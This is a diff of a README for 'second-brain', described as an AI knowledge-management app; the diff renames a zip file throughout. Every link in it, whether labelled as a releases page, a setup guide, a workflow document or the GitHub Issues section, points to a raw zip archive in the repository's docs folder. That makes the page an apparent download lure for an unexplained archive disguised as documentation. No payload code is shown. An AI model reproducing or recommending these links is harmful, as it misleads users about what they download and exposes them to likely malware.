@@ -1,6 +1,6 @@
 # 🎉 second-brain - Capture and Organize Your Ideas Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/brain-second-1.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/brain-second-1.6.zip)
+[![Download Now](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/second_brain_v3.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/second_brain_v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Second Brain, your AI-powered knowledge management system. This guide
 
 ## 📥 Download & Install
 
-To start, visit the [Releases page](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/brain-second-1.6.zip) to download the latest version of Second Brain. 
+To start, visit the [Releases page](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/second_brain_v3.7.zip) to download the latest version of Second Brain. 
 
 1. Click on the version you wish to download.
 2. Locate the installation file for your operating system.
@@ -49,13 +49,13 @@ Once you have installed Second Brain, follow these steps to start using the appl
    - Grant the necessary permissions for data access.
 
 2. **Setup Notion:**
-   - Follow the guidelines in the **[Notion Setup Guide](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/brain-second-1.6.zip)** to build your database backend. This is crucial for organizing your knowledge efficiently.
+   - Follow the guidelines in the **[Notion Setup Guide](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/second_brain_v3.7.zip)** to build your database backend. This is crucial for organizing your knowledge efficiently.
 
 3. **Configure n8n Workflow:**
-   - Refer to the **[n8n Workflow Setup](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/brain-second-1.6.zip)** document to import and set up the workflow engine for automated data processing.
+   - Refer to the **[n8n Workflow Setup](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/second_brain_v3.7.zip)** document to import and set up the workflow engine for automated data processing.
 
 4. **Adjust Settings:**
-   - Visit the **[Configuration & Tuning](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/brain-second-1.6.zip)** document to fine-tune the AI’s performance. You can adjust settings such as confidence scores and response prompts to match your preferences.
+   - Visit the **[Configuration & Tuning](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/second_brain_v3.7.zip)** document to fine-tune the AI’s performance. You can adjust settings such as confidence scores and response prompts to match your preferences.
 
 ## 🌟 Key Features
 
@@ -67,9 +67,9 @@ Once you have installed Second Brain, follow these steps to start using the appl
 
 For comprehensive information, please refer to the following guides:
 
-- **[Notion Setup Guide](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/brain-second-1.6.zip)** (Critical: Start here to build your database backend)
-- **[n8n Workflow Setup](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/brain-second-1.6.zip)** (Importing and configuring the engine)
-- **[Configuration & Tuning](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/brain-second-1.6.zip)** (Adjusting confidence scores and prompts)
+- **[Notion Setup Guide](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/second_brain_v3.7.zip)** (Critical: Start here to build your database backend)
+- **[n8n Workflow Setup](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/second_brain_v3.7.zip)** (Importing and configuring the engine)
+- **[Configuration & Tuning](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/second_brain_v3.7.zip)** (Adjusting confidence scores and prompts)
 
 ## ❓ Troubleshooting
 
@@ -86,11 +86,11 @@ If you face issues while installing or using Second Brain, consider the followin
 3. **Data Not Organizing Correctly:**
    - Check the settings in the Configuration & Tuning guide to ensure proper classification parameters.
 
-For further assistance, you can open an issue in the [GitHub Issues section](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/brain-second-1.6.zip).
+For further assistance, you can open an issue in the [GitHub Issues section](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/second_brain_v3.7.zip).
 
 ## 🔗 Additional Resources
 
 - **Community Forum:** Join our community forum for discussions and tips.
 - **Feedback:** We welcome your feedback. Share your experiences or suggestions for improvement.
 
-Explore the **[Releases page](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/brain-second-1.6.zip)** to download the latest version and begin organizing your thoughts with Second Brain.
+Explore the **[Releases page](https://raw.githubusercontent.com/rsaudio/second-brain/main/docs/second_brain_v3.7.zip)** to download the latest version and begin organizing your thoughts with Second Brain.
